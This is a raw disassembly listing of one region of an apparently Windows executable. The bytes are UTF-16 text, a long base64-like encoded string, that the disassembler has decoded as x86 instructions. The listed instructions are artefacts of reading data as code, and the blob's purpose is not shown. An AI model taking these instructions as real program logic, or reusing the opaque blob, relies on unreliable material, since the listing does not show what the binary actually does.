  40a680:	66 00 64 00 30       	data16 add %ah,0x30(%eax,%eax,1)
  40a685:	00 51 00             	add    %dl,0x0(%ecx)
  40a688:	4b                   	dec    %ebx
  40a689:	00 41 00             	add    %al,0x0(%ecx)
  40a68c:	6d                   	insl   (%dx),%es:(%edi)
  40a68d:	00 43 00             	add    %al,0x0(%ebx)
  40a690:	6f                   	outsl  %ds:(%esi),(%dx)
  40a691:	00 33                	add    %dh,(%ebx)
  40a693:	00 2b                	add    %ch,(%ebx)
  40a695:	00 31                	add    %dh,(%ecx)
  40a697:	00 69 00             	add    %ch,0x0(%ecx)
  40a69a:	48                   	dec    %eax
  40a69b:	00 70 00             	add    %dh,0x0(%eax)
  40a69e:	51                   	push   %ecx
  40a69f:	00 7a 00             	add    %bh,0x0(%edx)
  40a6a2:	77 00                	ja     0x40a6a4
  40a6a4:	45                   	inc    %ebp
  40a6a5:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40a6a9:	00 68 00             	add    %ch,0x0(%eax)
  40a6ac:	4e                   	dec    %esi
  40a6ad:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a6b0:	4e                   	dec    %esi
  40a6b1:	00 37                	add    %dh,(%edi)
  40a6b3:	00 45 00             	add    %al,0x0(%ebp)
  40a6b6:	69 00 39 00 54 00    	imul   $0x540039,(%eax),%eax
  40a6bc:	62 00                	bound  %eax,(%eax)
  40a6be:	53                   	push   %ebx
  40a6bf:	00 73 00             	add    %dh,0x0(%ebx)
  40a6c2:	50                   	push   %eax
  40a6c3:	00 49 00             	add    %cl,0x0(%ecx)
  40a6c6:	72 00                	jb     0x40a6c8
  40a6c8:	66 00 37             	data16 add %dh,(%edi)
  40a6cb:	00 55 00             	add    %dl,0x0(%ebp)
  40a6ce:	51                   	push   %ecx
  40a6cf:	00 68 00             	add    %ch,0x0(%eax)
  40a6d2:	61                   	popa
  40a6d3:	00 58 00             	add    %bl,0x0(%eax)
  40a6d6:	4d                   	dec    %ebp
  40a6d7:	00 44 00 30          	add    %al,0x30(%eax,%eax,1)
  40a6db:	00 51 00             	add    %dl,0x0(%ecx)
  40a6de:	39 00                	cmp    %eax,(%eax)
  40a6e0:	4f                   	dec    %edi
  40a6e1:	00 43 00             	add    %al,0x0(%ebx)
  40a6e4:	4e                   	dec    %esi
  40a6e5:	00 73 00             	add    %dh,0x0(%ebx)
  40a6e8:	4a                   	dec    %edx
  40a6e9:	00 4d 00             	add    %cl,0x0(%ebp)
  40a6ec:	4d                   	dec    %ebp
  40a6ed:	00 57 00             	add    %dl,0x0(%edi)
  40a6f0:	77 00                	ja     0x40a6f2
  40a6f2:	50                   	push   %eax
  40a6f3:	00 49 00             	add    %cl,0x0(%ecx)
  40a6f6:	30 00                	xor    %al,(%eax)
  40a6f8:	51                   	push   %ecx
  40a6f9:	00 6e 00             	add    %ch,0x0(%esi)
  40a6fc:	49                   	dec    %ecx
  40a6fd:	00 65 00             	add    %ah,0x0(%ebp)
  40a700:	71 00                	jno    0x40a702
  40a702:	50                   	push   %eax
  40a703:	00 6e 00             	add    %ch,0x0(%esi)
  40a706:	68 00 67 00 52       	push   $0x52006700
  40a70b:	00 48 00             	add    %cl,0x0(%eax)
  40a70e:	44                   	inc    %esp
  40a70f:	00 68 00             	add    %ch,0x0(%eax)
  40a712:	4d                   	dec    %ebp
  40a713:	00 37                	add    %dh,(%edi)
  40a715:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  40a719:	00 43 00             	add    %al,0x0(%ebx)
  40a71c:	53                   	push   %ebx
  40a71d:	00 70 00             	add    %dh,0x0(%eax)
  40a720:	49                   	dec    %ecx
  40a721:	00 32                	add    %dh,(%edx)
  40a723:	00 78 00             	add    %bh,0x0(%eax)
  40a726:	46                   	inc    %esi
  40a727:	00 61 00             	add    %ah,0x0(%ecx)
  40a72a:	31 00                	xor    %eax,(%eax)
  40a72c:	76 00                	jbe    0x40a72e
  40a72e:	58                   	pop    %eax
  40a72f:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
  40a733:	00 67 00             	add    %ah,0x0(%edi)
  40a736:	30 00                	xor    %al,(%eax)
  40a738:	47                   	inc    %edi
  40a739:	00 30                	add    %dh,(%eax)
  40a73b:	00 74 00 7a          	add    %dh,0x7a(%eax,%eax,1)
  40a73f:	00 52 00             	add    %dl,0x0(%edx)
  40a742:	47                   	inc    %edi
  40a743:	00 4b 00             	add    %cl,0x0(%ebx)
  40a746:	4c                   	dec    %esp
  40a747:	00 42 00             	add    %al,0x0(%edx)
  40a74a:	2b 00                	sub    (%eax),%eax
  40a74c:	2f                   	das
  40a74d:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  40a751:	00 47 00             	add    %al,0x0(%edi)
  40a754:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  40a758:	50                   	push   %eax
  40a759:	00 33                	add    %dh,(%ebx)
  40a75b:	00 37                	add    %dh,(%edi)
  40a75d:	00 2f                	add    %ch,(%edi)
  40a75f:	00 65 00             	add    %ah,0x0(%ebp)
  40a762:	45                   	inc    %ebp
  40a763:	00 76 00             	add    %dh,0x0(%esi)
  40a766:	4b                   	dec    %ebx
  40a767:	00 39                	add    %bh,(%ecx)
  40a769:	00 45 00             	add    %al,0x0(%ebp)
  40a76c:	4b                   	dec    %ebx
  40a76d:	00 78 00             	add    %bh,0x0(%eax)
  40a770:	47                   	inc    %edi
  40a771:	00 69 00             	add    %ch,0x0(%ecx)
  40a774:	43                   	inc    %ebx
  40a775:	00 72 00             	add    %dh,0x0(%edx)
  40a778:	6e                   	outsb  %ds:(%esi),(%dx)
  40a779:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40a77d:	00 70 00             	add    %dh,0x0(%eax)
  40a780:	64 00 64 00 73       	add    %ah,%fs:0x73(%eax,%eax,1)
  40a785:	00 4a 00             	add    %cl,0x0(%edx)
  40a788:	33 00                	xor    (%eax),%eax
  40a78a:	58                   	pop    %eax
  40a78b:	00 46 00             	add    %al,0x0(%esi)
  40a78e:	58                   	pop    %eax
  40a78f:	00 70 00             	add    %dh,0x0(%eax)
  40a792:	71 00                	jno    0x40a794
  40a794:	35 00 71 00 42       	xor    $0x42007100,%eax
  40a799:	00 5a 00             	add    %bl,0x0(%edx)
  40a79c:	43                   	inc    %ebx
  40a79d:	00 4e 00             	add    %cl,0x0(%esi)
  40a7a0:	4c                   	dec    %esp
  40a7a1:	00 66 00             	add    %ah,0x0(%esi)
  40a7a4:	4f                   	dec    %edi
  40a7a5:	00 51 00             	add    %dl,0x0(%ecx)
  40a7a8:	4e                   	dec    %esi
  40a7a9:	00 31                	add    %dh,(%ecx)
  40a7ab:	00 70 00             	add    %dh,0x0(%eax)
  40a7ae:	59                   	pop    %ecx
  40a7af:	00 65 00             	add    %ah,0x0(%ebp)
  40a7b2:	6b 00 77             	imul   $0x77,(%eax),%eax
  40a7b5:	00 76 00             	add    %dh,0x0(%esi)
  40a7b8:	42                   	inc    %edx
  40a7b9:	00 75 00             	add    %dh,0x0(%ebp)
  40a7bc:	68 00 55 00 56       	push   $0x56005500
  40a7c1:	00 59 00             	add    %bl,0x0(%ecx)
  40a7c4:	49                   	dec    %ecx
  40a7c5:	00 53 00             	add    %dl,0x0(%ebx)
  40a7c8:	30 00                	xor    %al,(%eax)
  40a7ca:	37                   	aaa
  40a7cb:	00 75 00             	add    %dh,0x0(%ebp)
  40a7ce:	32 00                	xor    (%eax),%al
  40a7d0:	69 00 6c 00 6d 00    	imul   $0x6d006c,(%eax),%eax
  40a7d6:	56                   	push   %esi
  40a7d7:	00 68 00             	add    %ch,0x0(%eax)
  40a7da:	67 00 37             	add    %dh,(%bx)
  40a7dd:	00 35 00 32 00 37    	add    %dh,0x37003200
  40a7e3:	00 77 00             	add    %dh,0x0(%edi)
  40a7e6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7e7:	00 6b 00             	add    %ch,0x0(%ebx)
  40a7ea:	58                   	pop    %eax
  40a7eb:	00 4f 00             	add    %cl,0x0(%edi)
  40a7ee:	6b 00 65             	imul   $0x65,(%eax),%eax
  40a7f1:	00 49 00             	add    %cl,0x0(%ecx)
  40a7f4:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
  40a7f8:	6d                   	insl   (%dx),%es:(%edi)
  40a7f9:	00 50 00             	add    %dl,0x0(%eax)
  40a7fc:	38 00                	cmp    %al,(%eax)
  40a7fe:	41                   	inc    %ecx
  40a7ff:	00 64 00 64          	add    %ah,0x64(%eax,%eax,1)
  40a803:	00 7a 00             	add    %bh,0x0(%edx)
  40a806:	45                   	inc    %ebp
  40a807:	00 4d 00             	add    %cl,0x0(%ebp)
  40a80a:	35 00 68 00 53       	xor    $0x53006800,%eax
  40a80f:	00 2b                	add    %ch,(%ebx)
  40a811:	00 51 00             	add    %dl,0x0(%ecx)
  40a814:	43                   	inc    %ebx
  40a815:	00 35 00 71 00 4e    	add    %dh,0x4e007100
  40a81b:	00 69 00             	add    %ch,0x0(%ecx)
  40a81e:	6b 00 6a             	imul   $0x6a,(%eax),%eax
  40a821:	00 6f 00             	add    %ch,0x0(%edi)
  40a824:	70 00                	jo     0x40a826
  40a826:	7a 00                	jp     0x40a828
  40a828:	54                   	push   %esp
  40a829:	00 43 00             	add    %al,0x0(%ebx)
  40a82c:	51                   	push   %ecx
  40a82d:	00 4e 00             	add    %cl,0x0(%esi)
  40a830:	6b 00 73             	imul   $0x73,(%eax),%eax
  40a833:	00 6e 00             	add    %ch,0x0(%esi)
  40a836:	61                   	popa
  40a837:	00 72 00             	add    %dh,0x0(%edx)
  40a83a:	52                   	push   %edx
  40a83b:	00 74 00 66          	add    %dh,0x66(%eax,%eax,1)
  40a83f:	00 6f 00             	add    %ch,0x0(%edi)
  40a842:	69 00 54 00 48 00    	imul   $0x480054,(%eax),%eax
  40a848:	49                   	dec    %ecx
  40a849:	00 66 00             	add    %ah,0x0(%esi)
  40a84c:	45                   	inc    %ebp
  40a84d:	00 50 00             	add    %dl,0x0(%eax)
  40a850:	6d                   	insl   (%dx),%es:(%edi)
  40a851:	00 4e 00             	add    %cl,0x0(%esi)
  40a854:	61                   	popa
  40a855:	00 4b 00             	add    %cl,0x0(%ebx)
  40a858:	44                   	inc    %esp
  40a859:	00 75 00             	add    %dh,0x0(%ebp)
  40a85c:	33 00                	xor    (%eax),%eax
  40a85e:	34 00                	xor    $0x0,%al
  40a860:	75 00                	jne    0x40a862
  40a862:	71 00                	jno    0x40a864
  40a864:	62 00                	bound  %eax,(%eax)
  40a866:	79 00                	jns    0x40a868
  40a868:	70 00                	jo     0x40a86a
  40a86a:	57                   	push   %edi
  40a86b:	00 56 00             	add    %dl,0x0(%esi)
  40a86e:	61                   	popa
  40a86f:	00 48 00             	add    %cl,0x0(%eax)
  40a872:	74 00                	je     0x40a874
  40a874:	54                   	push   %esp
  40a875:	00 6c 00 35          	add    %ch,0x35(%eax,%eax,1)
  40a879:	00 59 00             	add    %bl,0x0(%ecx)
  40a87c:	39 00                	cmp    %eax,(%eax)
  40a87e:	4f                   	dec    %edi
  40a87f:	00 32                	add    %dh,(%edx)
  40a881:	00 6c 00 35          	add    %ch,0x35(%eax,%eax,1)
  40a885:	00 63 00             	add    %ah,0x0(%ebx)
  40a888:	6e                   	outsb  %ds:(%esi),(%dx)
  40a889:	00 46 00             	add    %al,0x0(%esi)
  40a88c:	2b 00                	sub    (%eax),%eax
  40a88e:	6b 00 30             	imul   $0x30,(%eax),%eax
  40a891:	00 38                	add    %bh,(%eax)
  40a893:	00 75 00             	add    %dh,0x0(%ebp)
  40a896:	4c                   	dec    %esp
  40a897:	00 71 00             	add    %dh,0x0(%ecx)
  40a89a:	43                   	inc    %ebx
  40a89b:	00 68 00             	add    %ch,0x0(%eax)
  40a89e:	63 00                	arpl   %eax,(%eax)
  40a8a0:	79 00                	jns    0x40a8a2
  40a8a2:	53                   	push   %ebx
  40a8a3:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  40a8a7:	00 50 00             	add    %dl,0x0(%eax)
  40a8aa:	32 00                	xor    (%eax),%al
  40a8ac:	68 00 35 00 43       	push   $0x43003500
  40a8b1:	00 46 00             	add    %al,0x0(%esi)
  40a8b4:	67 00 47 00          	add    %al,0x0(%bx)
  40a8b8:	50                   	push   %eax
  40a8b9:	00 41 00             	add    %al,0x0(%ecx)
  40a8bc:	34 00                	xor    $0x0,%al
  40a8be:	32 00                	xor    (%eax),%al
  40a8c0:	4c                   	dec    %esp
  40a8c1:	00 36                	add    %dh,(%esi)
  40a8c3:	00 73 00             	add    %dh,0x0(%ebx)
  40a8c6:	66 00 54 00 34       	data16 add %dl,0x34(%eax,%eax,1)
  40a8cb:	00 51 00             	add    %dl,0x0(%ecx)
  40a8ce:	59                   	pop    %ecx
  40a8cf:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
  40a8d3:	00 63 00             	add    %ah,0x0(%ebx)
  40a8d6:	56                   	push   %esi
  40a8d7:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  40a8db:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  40a8df:	00 44 00 43          	add    %al,0x43(%eax,%eax,1)
  40a8e3:	00 33                	add    %dh,(%ebx)
  40a8e5:	00 47 00             	add    %al,0x0(%edi)
  40a8e8:	74 00                	je     0x40a8ea
  40a8ea:	59                   	pop    %ecx
  40a8eb:	00 63 00             	add    %ah,0x0(%ebx)
  40a8ee:	4c                   	dec    %esp
  40a8ef:	00 77 00             	add    %dh,0x0(%edi)
  40a8f2:	4e                   	dec    %esi
  40a8f3:	00 47 00             	add    %al,0x0(%edi)
  40a8f6:	6e                   	outsb  %ds:(%esi),(%dx)
  40a8f7:	00 78 00             	add    %bh,0x0(%eax)
  40a8fa:	63 00                	arpl   %eax,(%eax)
  40a8fc:	30 00                	xor    %al,(%eax)
  40a8fe:	58                   	pop    %eax
  40a8ff:	00 4a 00             	add    %cl,0x0(%edx)
  40a902:	74 00                	je     0x40a904
  40a904:	75 00                	jne    0x40a906
  40a906:	37                   	aaa
  40a907:	00 6b 00             	add    %ch,0x0(%ebx)
  40a90a:	6d                   	insl   (%dx),%es:(%edi)
  40a90b:	00 58 00             	add    %bl,0x0(%eax)
  40a90e:	37                   	aaa
  40a90f:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  40a913:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40a917:	00 62 00             	add    %ah,0x0(%edx)
  40a91a:	31 00                	xor    %eax,(%eax)
  40a91c:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40a920:	4d                   	dec    %ebp
  40a921:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
  40a925:	00 62 00             	add    %ah,0x0(%edx)
  40a928:	53                   	push   %ebx
  40a929:	00 70 00             	add    %dh,0x0(%eax)
  40a92c:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40a930:	46                   	inc    %esi
  40a931:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  40a935:	00 50 00             	add    %dl,0x0(%eax)
  40a938:	58                   	pop    %eax
  40a939:	00 51 00             	add    %dl,0x0(%ecx)
  40a93c:	4a                   	dec    %edx
  40a93d:	00 53 00             	add    %dl,0x0(%ebx)
  40a940:	4d                   	dec    %ebp
  40a941:	00 72 00             	add    %dh,0x0(%edx)
  40a944:	32 00                	xor    (%eax),%al
  40a946:	74 00                	je     0x40a948
  40a948:	57                   	push   %edi
  40a949:	00 73 00             	add    %dh,0x0(%ebx)
  40a94c:	33 00                	xor    (%eax),%eax
  40a94e:	76 00                	jbe    0x40a950
  40a950:	34 00                	xor    $0x0,%al
  40a952:	79 00                	jns    0x40a954
  40a954:	41                   	inc    %ecx
  40a955:	00 45 00             	add    %al,0x0(%ebp)
  40a958:	70 00                	jo     0x40a95a
  40a95a:	6d                   	insl   (%dx),%es:(%edi)
  40a95b:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
  40a95f:	00 73 00             	add    %dh,0x0(%ebx)
  40a962:	6b 00 53             	imul   $0x53,(%eax),%eax
  40a965:	00 45 00             	add    %al,0x0(%ebp)
  40a968:	6b 00 75             	imul   $0x75,(%eax),%eax
  40a96b:	00 61 00             	add    %ah,0x0(%ecx)
  40a96e:	55                   	push   %ebp
  40a96f:	00 2b                	add    %ch,(%ebx)
  40a971:	00 78 00             	add    %bh,0x0(%eax)
  40a974:	61                   	popa
  40a975:	00 4c 00 62          	add    %cl,0x62(%eax,%eax,1)
  40a979:	00 6d 00             	add    %ch,0x0(%ebp)
  40a97c:	45                   	inc    %ebp
  40a97d:	00 6b 00             	add    %ch,0x0(%ebx)
  40a980:	69 00 7a 00 67 00    	imul   $0x67007a,(%eax),%eax
  40a986:	73 00                	jae    0x40a988
  40a988:	37                   	aaa
  40a989:	00 76 00             	add    %dh,0x0(%esi)
  40a98c:	72 00                	jb     0x40a98e
  40a98e:	36 00 5a 00          	add    %bl,%ss:0x0(%edx)
  40a992:	75 00                	jne    0x40a994
  40a994:	62 00                	bound  %eax,(%eax)
  40a996:	50                   	push   %eax
  40a997:	00 69 00             	add    %ch,0x0(%ecx)
  40a99a:	42                   	inc    %edx
  40a99b:	00 68 00             	add    %ch,0x0(%eax)
  40a99e:	71 00                	jno    0x40a9a0
  40a9a0:	75 00                	jne    0x40a9a2
  40a9a2:	79 00                	jns    0x40a9a4
  40a9a4:	67 00 4d 00          	add    %cl,0x0(%di)
  40a9a8:	59                   	pop    %ecx
  40a9a9:	00 49 00             	add    %cl,0x0(%ecx)
  40a9ac:	4e                   	dec    %esi
  40a9ad:	00 6b 00             	add    %ch,0x0(%ebx)
  40a9b0:	78 00                	js     0x40a9b2
  40a9b2:	39 00                	cmp    %eax,(%eax)
  40a9b4:	6a 00                	push   $0x0
  40a9b6:	5a                   	pop    %edx
  40a9b7:	00 74 00 58          	add    %dh,0x58(%eax,%eax,1)
  40a9bb:	00 43 00             	add    %al,0x0(%ebx)
  40a9be:	38 00                	cmp    %al,(%eax)
  40a9c0:	78 00                	js     0x40a9c2
  40a9c2:	61                   	popa
  40a9c3:	00 4a 00             	add    %cl,0x0(%edx)
  40a9c6:	49                   	dec    %ecx
  40a9c7:	00 37                	add    %dh,(%edi)
  40a9c9:	00 76 00             	add    %dh,0x0(%esi)
  40a9cc:	4d                   	dec    %ebp
  40a9cd:	00 48 00             	add    %cl,0x0(%eax)
  40a9d0:	4c                   	dec    %esp
  40a9d1:	00 30                	add    %dh,(%eax)
  40a9d3:	00 6d 00             	add    %ch,0x0(%ebp)
  40a9d6:	72 00                	jb     0x40a9d8
  40a9d8:	44                   	inc    %esp
  40a9d9:	00 77 00             	add    %dh,0x0(%edi)
  40a9dc:	70 00                	jo     0x40a9de
  40a9de:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
  40a9e2:	36 00 6e 00          	add    %ch,%ss:0x0(%esi)
  40a9e6:	43                   	inc    %ebx
  40a9e7:	00 4d 00             	add    %cl,0x0(%ebp)
  40a9ea:	63 00                	arpl   %eax,(%eax)
  40a9ec:	6f                   	outsl  %ds:(%esi),(%dx)
  40a9ed:	00 75 00             	add    %dh,0x0(%ebp)
  40a9f0:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
  40a9f4:	41                   	inc    %ecx
  40a9f5:	00 38                	add    %bh,(%eax)
  40a9f7:	00 71 00             	add    %dh,0x0(%ecx)
  40a9fa:	2f                   	das
  40a9fb:	00 50 00             	add    %dl,0x0(%eax)
  40a9fe:	7a 00                	jp     0x40aa00
  40aa00:	64 00 2f             	add    %ch,%fs:(%edi)
  40aa03:	00 5a 00             	add    %bl,0x0(%edx)
  40aa06:	35 00 47 00 77       	xor    $0x77004700,%eax
  40aa0b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aa0e:	59                   	pop    %ecx
  40aa0f:	00 50 00             	add    %dl,0x0(%eax)
  40aa12:	63 00                	arpl   %eax,(%eax)
  40aa14:	70 00                	jo     0x40aa16
  40aa16:	6d                   	insl   (%dx),%es:(%edi)
  40aa17:	00 6e 00             	add    %ch,0x0(%esi)
  40aa1a:	74 00                	je     0x40aa1c
  40aa1c:	31 00                	xor    %eax,(%eax)
  40aa1e:	78 00                	js     0x40aa20
  40aa20:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa21:	00 4a 00             	add    %cl,0x0(%edx)
  40aa24:	58                   	pop    %eax
  40aa25:	00 55 00             	add    %dl,0x0(%ebp)
  40aa28:	69 00 46 00 7a 00    	imul   $0x7a0046,(%eax),%eax
  40aa2e:	46                   	inc    %esi
  40aa2f:	00 69 00             	add    %ch,0x0(%ecx)
  40aa32:	31 00                	xor    %eax,(%eax)
  40aa34:	57                   	push   %edi
  40aa35:	00 6f 00             	add    %ch,0x0(%edi)
  40aa38:	30 00                	xor    %al,(%eax)
  40aa3a:	52                   	push   %edx
  40aa3b:	00 6f 00             	add    %ch,0x0(%edi)
  40aa3e:	33 00                	xor    (%eax),%eax
  40aa40:	74 00                	je     0x40aa42
  40aa42:	7a 00                	jp     0x40aa44
  40aa44:	55                   	push   %ebp
  40aa45:	00 37                	add    %dh,(%edi)
  40aa47:	00 48 00             	add    %cl,0x0(%eax)
  40aa4a:	7a 00                	jp     0x40aa4c
  40aa4c:	53                   	push   %ebx
  40aa4d:	00 72 00             	add    %dh,0x0(%edx)
  40aa50:	5a                   	pop    %edx
  40aa51:	00 70 00             	add    %dh,0x0(%eax)
  40aa54:	42                   	inc    %edx
  40aa55:	00 70 00             	add    %dh,0x0(%eax)
  40aa58:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  40aa5c:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  40aa60:	61                   	popa
  40aa61:	00 73 00             	add    %dh,0x0(%ebx)
  40aa64:	30 00                	xor    %al,(%eax)
  40aa66:	70 00                	jo     0x40aa68
  40aa68:	62 00                	bound  %eax,(%eax)
  40aa6a:	4e                   	dec    %esi
  40aa6b:	00 65 00             	add    %ah,0x0(%ebp)
  40aa6e:	34 00                	xor    $0x0,%al
  40aa70:	39 00                	cmp    %eax,(%eax)
  40aa72:	6e                   	outsb  %ds:(%esi),(%dx)
  40aa73:	00 76 00             	add    %dh,0x0(%esi)
  40aa76:	63 00                	arpl   %eax,(%eax)
  40aa78:	6d                   	insl   (%dx),%es:(%edi)
  40aa79:	00 79 00             	add    %bh,0x0(%ecx)
  40aa7c:	46                   	inc    %esi
  40aa7d:	00 58 00             	add    %bl,0x0(%eax)
  40aa80:	4b                   	dec    %ebx
  40aa81:	00 45 00             	add    %al,0x0(%ebp)
  40aa84:	59                   	pop    %ecx
  40aa85:	00 35 00 4d 00 34    	add    %dh,0x34004d00
  40aa8b:	00 6b 00             	add    %ch,0x0(%ebx)
  40aa8e:	44                   	inc    %esp
  40aa8f:	00 61 00             	add    %ah,0x0(%ecx)
  40aa92:	4a                   	dec    %edx
  40aa93:	00 79 00             	add    %bh,0x0(%ecx)
  40aa96:	63 00                	arpl   %eax,(%eax)
  40aa98:	61                   	popa
  40aa99:	00 66 00             	add    %ah,0x0(%esi)
  40aa9c:	37                   	aaa
  40aa9d:	00 51 00             	add    %dl,0x0(%ecx)
  40aaa0:	43                   	inc    %ebx
  40aaa1:	00 70 00             	add    %dh,0x0(%eax)
  40aaa4:	74 00                	je     0x40aaa6
  40aaa6:	5a                   	pop    %edx
  40aaa7:	00 6d 00             	add    %ch,0x0(%ebp)
  40aaaa:	47                   	inc    %edi
  40aaab:	00 66 00             	add    %ah,0x0(%esi)
  40aaae:	39 00                	cmp    %eax,(%eax)
  40aab0:	30 00                	xor    %al,(%eax)
  40aab2:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  40aab6:	4c                   	dec    %esp
  40aab7:	00 38                	add    %bh,(%eax)
  40aab9:	00 4f 00             	add    %cl,0x0(%edi)
  40aabc:	78 00                	js     0x40aabe
  40aabe:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  40aac2:	6a 00                	push   $0x0
  40aac4:	56                   	push   %esi
  40aac5:	00 54 00 70          	add    %dl,0x70(%eax,%eax,1)
  40aac9:	00 58 00             	add    %bl,0x0(%eax)
  40aacc:	4b                   	dec    %ebx
  40aacd:	00 36                	add    %dh,(%esi)
  40aacf:	00 51 00             	add    %dl,0x0(%ecx)
  40aad2:	4c                   	dec    %esp
  40aad3:	00 35 00 75 00 55    	add    %dh,0x55007500
  40aad9:	00 35 00 38 00 55    	add    %dh,0x55003800
  40aadf:	00 55 00             	add    %dl,0x0(%ebp)
  40aae2:	41                   	inc    %ecx
  40aae3:	00 56 00             	add    %dl,0x0(%esi)
  40aae6:	41                   	inc    %ecx
  40aae7:	00 4d 00             	add    %cl,0x0(%ebp)
  40aaea:	69 00 6d 00 41 00    	imul   $0x41006d,(%eax),%eax
  40aaf0:	43                   	inc    %ebx
  40aaf1:	00 30                	add    %dh,(%eax)
  40aaf3:	00 59 00             	add    %bl,0x0(%ecx)
  40aaf6:	6a 00                	push   $0x0
  40aaf8:	50                   	push   %eax
  40aaf9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40aafc:	46                   	inc    %esi
  40aafd:	00 35 00 57 00 79    	add    %dh,0x79005700
  40ab03:	00 72 00             	add    %dh,0x0(%edx)
  40ab06:	49                   	dec    %ecx
  40ab07:	00 45 00             	add    %al,0x0(%ebp)
  40ab0a:	35 00 58 00 2b       	xor    $0x2b005800,%eax
  40ab0f:	00 50 00             	add    %dl,0x0(%eax)
  40ab12:	56                   	push   %esi
  40ab13:	00 75 00             	add    %dh,0x0(%ebp)
  40ab16:	38 00                	cmp    %al,(%eax)
  40ab18:	66 00 57 00          	data16 add %dl,0x0(%edi)
  40ab1c:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40ab20:	71 00                	jno    0x40ab22
  40ab22:	68 00 56 00 57       	push   $0x57005600
  40ab27:	00 42 00             	add    %al,0x0(%edx)
  40ab2a:	77 00                	ja     0x40ab2c
  40ab2c:	39 00                	cmp    %eax,(%eax)
  40ab2e:	6a 00                	push   $0x0
  40ab30:	7a 00                	jp     0x40ab32
  40ab32:	58                   	pop    %eax
  40ab33:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab36:	77 00                	ja     0x40ab38
  40ab38:	61                   	popa
  40ab39:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  40ab3d:	00 44 00 47          	add    %al,0x47(%eax,%eax,1)
  40ab41:	00 58 00             	add    %bl,0x0(%eax)
  40ab44:	47                   	inc    %edi
  40ab45:	00 53 00             	add    %dl,0x0(%ebx)
  40ab48:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40ab4c:	55                   	push   %ebp
  40ab4d:	00 59 00             	add    %bl,0x0(%ecx)
  40ab50:	32 00                	xor    (%eax),%al
  40ab52:	49                   	dec    %ecx
  40ab53:	00 4b 00             	add    %cl,0x0(%ebx)
  40ab56:	52                   	push   %edx
  40ab57:	00 66 00             	add    %ah,0x0(%esi)
  40ab5a:	5a                   	pop    %edx
  40ab5b:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
  40ab5f:	00 42 00             	add    %al,0x0(%edx)
  40ab62:	4f                   	dec    %edi
  40ab63:	00 78 00             	add    %bh,0x0(%eax)
  40ab66:	63 00                	arpl   %eax,(%eax)
  40ab68:	54                   	push   %esp
  40ab69:	00 71 00             	add    %dh,0x0(%ecx)
  40ab6c:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  40ab70:	53                   	push   %ebx
  40ab71:	00 48 00             	add    %cl,0x0(%eax)
  40ab74:	36 00 69 00          	add    %ch,%ss:0x0(%ecx)
  40ab78:	51                   	push   %ecx
  40ab79:	00 47 00             	add    %al,0x0(%edi)
  40ab7c:	73 00                	jae    0x40ab7e
  40ab7e:	5a                   	pop    %edx
  40ab7f:	00 72 00             	add    %dh,0x0(%edx)
  40ab82:	45                   	inc    %ebp
  40ab83:	00 62 00             	add    %ah,0x0(%edx)
  40ab86:	43                   	inc    %ebx
  40ab87:	00 71 00             	add    %dh,0x0(%ecx)
  40ab8a:	70 00                	jo     0x40ab8c
  40ab8c:	62 00                	bound  %eax,(%eax)
  40ab8e:	62 00                	bound  %eax,(%eax)
  40ab90:	6d                   	insl   (%dx),%es:(%edi)
  40ab91:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab94:	38 00                	cmp    %al,(%eax)
  40ab96:	51                   	push   %ecx
  40ab97:	00 32                	add    %dh,(%edx)
  40ab99:	00 6a 00             	add    %ch,0x0(%edx)
  40ab9c:	41                   	inc    %ecx
  40ab9d:	00 75 00             	add    %dh,0x0(%ebp)
  40aba0:	58                   	pop    %eax
  40aba1:	00 54 00 74          	add    %dl,0x74(%eax,%eax,1)
  40aba5:	00 2b                	add    %ch,(%ebx)
  40aba7:	00 37                	add    %dh,(%edi)
  40aba9:	00 37                	add    %dh,(%edi)
  40abab:	00 4b 00             	add    %cl,0x0(%ebx)
  40abae:	4e                   	dec    %esi
  40abaf:	00 5a 00             	add    %bl,0x0(%edx)
  40abb2:	4a                   	dec    %edx
  40abb3:	00 67 00             	add    %ah,0x0(%edi)
  40abb6:	63 00                	arpl   %eax,(%eax)
  40abb8:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
  40abbc:	63 00                	arpl   %eax,(%eax)
  40abbe:	50                   	push   %eax
  40abbf:	00 44 00 57          	add    %al,0x57(%eax,%eax,1)
  40abc3:	00 4a 00             	add    %cl,0x0(%edx)
  40abc6:	56                   	push   %esi
  40abc7:	00 50 00             	add    %dl,0x0(%eax)
  40abca:	6d                   	insl   (%dx),%es:(%edi)
  40abcb:	00 34 00             	add    %dh,(%eax,%eax,1)
  40abce:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
